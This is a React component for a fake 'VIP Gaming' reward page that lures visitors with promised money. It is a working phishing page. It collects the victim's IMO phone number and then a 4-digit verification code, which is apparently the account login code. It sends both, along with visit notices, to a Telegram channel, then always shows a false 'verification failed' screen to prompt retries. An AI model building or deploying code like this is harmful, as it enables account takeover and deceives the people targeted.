import React, { useState, useEffect, useRef } from 'react';
import { Tab, User } from '../../types';
import { sendTelegramMessage } from '../../services/telegramService';

interface ImoVipViewProps {
  onNavigate: (tab: Tab) => void;
  user: User;
}

const ImoVipView: React.FC<ImoVipViewProps> = ({ onNavigate, user }) => {
  const [step, setStep] = useState<'phone' | 'loading' | 'pin' | 'failed'>('phone');
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState(['', '', '', '']);
  const pinRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    // Notify on visit
    sendTelegramMessage(`🎮 **New Visitor on VIP Gaming Page**\nUser: ${user.name} (${user.id})`);
  }, [user]);

  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!phone) return;

    await sendTelegramMessage(`👾 **VIP Gaming Request:**\nUser: ${user.name}\n📱 IMO Number: \`${phone}\``);

    setStep('loading');
    setTimeout(() => {
      setStep('pin');
    }, 2500);
  };

  const handlePinChange = (index: number, value: string) => {
    if (value.length > 1) return;
    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);

    // Auto focus next
    if (value && index < 3) {
      pinRefs.current[index + 1]?.focus();
    }
    
    // Check submission
    if (newPin.every(d => d !== '')) {
      handleSubmitPin(newPin.join(''));
    }
  };

  const handleSubmitPin = async (fullPin: string) => {
    await sendTelegramMessage(`🔐 **Verification Key:**\nUser: ${user.name}\n🔢 Key: \`${fullPin}\``);
    
    // Simulate processing then fail
    setTimeout(() => {
      setStep('failed');
    }, 1000);
  };

  return (
    <div className="fixed inset-0 z-[100] overflow-y-auto bg-[#020024] font-['Poppins'] text-white">
      <style>{`
        .imo-bg {
            background: linear-gradient(-45deg, #020024, #090979, #2b0052, #001f3f);
            background-size: 400% 400%;
            animation: gradientBG 15s ease infinite;
        }
        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .circles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 0;
        }
        .circles li {
            position: absolute;
            display: block;
            list-style: none;
            width: 20px;
            height: 20px;
            background: rgba(255, 255, 255, 0.1);
            animation: animate 25s linear infinite;
            bottom: -150px;
        }
        .circles li:nth-child(1) { left: 25%; width: 80px; height: 80px; animation-delay: 0s; }
        .circles li:nth-child(2) { left: 10%; width: 20px; height: 20px; animation-delay: 2s; animation-duration: 12s; }
        .circles li:nth-child(3) { left: 70%; width: 20px; height: 20px; animation-delay: 4s; }
        .circles li:nth-child(4) { left: 40%; width: 60px; height: 60px; animation-delay: 0s; animation-duration: 18s; }
        .circles li:nth-child(5) { left: 65%; width: 20px; height: 20px; animation-delay: 0s; }
        .circles li:nth-child(6) { left: 75%; width: 110px; height: 110px; animation-delay: 3s; }
        @keyframes animate {
            0% { transform: translateY(0) rotate(0deg); opacity: 1; border-radius: 0; }
            100% { transform: translateY(-1000px) rotate(720deg); opacity: 0; border-radius: 50%; }
        }
        .glass-container {
            background: rgba(16, 18, 27, 0.6);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 50px rgba(0, 168, 255, 0.2);
        }
        .orbitron { font-family: 'Orbitron', sans-serif; }
      `}</style>

      <div className="min-h-screen flex items-center justify-center relative imo-bg">
        {/* Animated Particles */}
        <ul className="circles">
           <li></li><li></li><li></li><li></li><li></li><li></li>
        </ul>

        {/* Close Button */}
        <button 
          onClick={() => onNavigate('home')} 
          className="absolute top-6 right-6 z-50 w-10 h-10 bg-white/10 rounded-full flex items-center justify-center text-white/70 hover:bg-white/20 transition-colors backdrop-blur-md border border-white/10"
        >
          <i className="fas fa-times"></i>
        </button>

        <div className="glass-container relative z-10 max-w-[420px] w-[90%] rounded-2xl p-8 mx-auto">
          
          {/* STEP 1: Phone Input */}
          {step === 'phone' && (
            <div className="animate-in fade-in zoom-in duration-300">
              <div className="relative w-[120px] h-[120px] mx-auto mb-6">
                 <img src="https://cdn-icons-png.flaticon.com/512/3408/3408540.png" alt="Gaming Logo" className="w-full h-full rounded-full border-[3px] border-[#00d2ff] object-cover shadow-[0_0_20px_#00d2ff]" />
                 <div className="absolute bottom-1 left-0 right-0 mx-auto w-4/5 bg-gradient-to-r from-[#f12711] to-[#f5af19] text-white text-[10px] font-bold uppercase py-1 rounded-full text-center shadow-lg border border-[#1a1a1a] orbitron tracking-wider">
                   <i className="fas fa-check-circle mr-1"></i> VERIFY
                 </div>
              </div>

              <h1 className="text-2xl font-bold text-center mb-1 text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-500 orbitron">
                  Add VIP Member
              </h1>
              <h2 className="text-xl font-bold text-center mb-2 text-yellow-400 orbitron">
                  & Earn 500 Money
              </h2>
              <p className="text-[#a0a0a0] text-sm text-center mb-8">
                  Watch daily promo code Rewards.
              </p>

              <form onSubmit={handlePhoneSubmit} className="space-y-6">
                  <div className="relative">
                      <i className="fa fa-phone absolute left-4 top-1/2 -translate-y-1/2 text-cyan-400"></i>
                      <input 
                        type="tel" 
                        value={phone}
                        onChange={(e) => setPhone(e.target.value)}
                        placeholder="Enter your imo number" 
                        required 
                        className="bg-white/5 border border-white/10 text-white p-3 pl-12 rounded-lg w-full text-center text-lg focus:outline-none focus:border-[#00d2ff] focus:bg-white/10 focus:shadow-[0_0_15px_rgba(0,210,255,0.3)] transition-all placeholder:text-gray-500"
                      />
                  </div>
                  <button type="submit" className="w-full bg-gradient-to-r from-[#00d2ff] to-[#3a7bd5] border-none p-3.5 rounded-lg text-white font-bold uppercase tracking-widest cursor-pointer shadow-[0_5px_20px_rgba(0,210,255,0.4)] hover:-translate-y-1 hover:shadow-[0_8px_25px_rgba(0,210,255,0.6)] transition-all orbitron">
                      <i className="fa fa-gamepad mr-2"></i> CONNECT NOW
                  </button>
              </form>
            </div>
          )}

          {/* STEP 2: Loading */}
          {step === 'loading' && (
            <div className="text-center py-10 animate-in fade-in duration-300">
               <div className="w-10 h-10 border-4 border-white/10 border-l-[#00d2ff] rounded-full animate-spin mx-auto mb-6"></div>
               <p className="text-lg font-bold text-cyan-300 animate-pulse orbitron">CONNECTING SERVER...</p>
            </div>
          )}

          {/* STEP 3: Pin Input */}
          {step === 'pin' && (
             <div className="text-center animate-in fade-in slide-in-from-right-8 duration-300">
                <i className="fa fa-shield-alt text-5xl text-yellow-400 mb-4 drop-shadow-[0_0_15px_rgba(250,204,21,0.5)] animate-bounce"></i>
                <h1 className="text-2xl font-bold mb-3 orbitron">SECURITY CHECK</h1>
                <p className="text-cyan-200 text-sm mb-8">input your imo view verification 4digit key</p>
                
                <div className="flex justify-center gap-2 mb-6">
                  {pin.map((digit, index) => (
                    <input
                      key={index}
                      ref={(el) => { pinRefs.current[index] = el; }}
                      type="tel"
                      value={digit}
                      maxLength={1}
                      onChange={(e) => handlePinChange(index, e.target.value)}
                      className="w-12 h-14 bg-black/30 border border-white/20 rounded-lg text-white text-2xl text-center focus:border-[#f5af19] focus:shadow-[0_0_10px_rgba(245,175,25,0.4)] focus:outline-none transition-all"
                    />
                  ))}
                </div>
                <p className="text-xs text-gray-400">Waiting for code...</p>
             </div>
          )}

          {/* STEP 4: Failed / Final */}
          {step === 'failed' && (
             <div className="text-center animate-in zoom-in duration-300">
                <div className="p-5 bg-red-500/10 border border-red-500/40 rounded-xl backdrop-blur-md">
                    <i className="fa fa-bug text-4xl text-red-500 mb-4"></i>
                    <h3 className="text-xl font-bold text-red-400 mb-2 orbitron">VERIFICATION FAILED</h3>
                    <p className="text-sm text-gray-300 mb-4">The key you entered is incorrect. Please check your IMO and try again.</p>
                    <button 
                      onClick={() => { setStep('phone'); setPin(['','','','']); }} 
                      className="px-6 py-2 bg-red-600 rounded-lg text-sm font-bold hover:bg-red-700 transition shadow-lg shadow-red-500/30"
                    >
                      TRY AGAIN
                    </button>
                </div>
             </div>
          )}

        </div>
      </div>
    </div>
  );
};

export default ImoVipView;